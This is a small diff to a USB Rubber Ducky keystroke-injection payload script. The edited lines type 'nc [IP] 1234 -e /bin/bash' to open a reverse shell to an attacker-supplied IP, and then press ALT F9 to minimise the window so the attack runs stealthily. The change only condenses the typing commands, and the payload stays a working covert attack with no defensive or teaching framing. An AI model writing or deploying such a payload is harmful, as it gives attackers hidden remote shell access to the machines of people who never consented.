@@ -9,9 +9,7 @@ DELAY 1000
 
 REM Start reverse shell
 REM [IP] will need to be replaced with attacker IP
-STRING nc [IP] 1234 -e /bin/bash
-ENTER
+STRINGLN nc [IP] 1234 -e /bin/bash
 
 REM Minimise window to run stealthily
 ALT F9
-
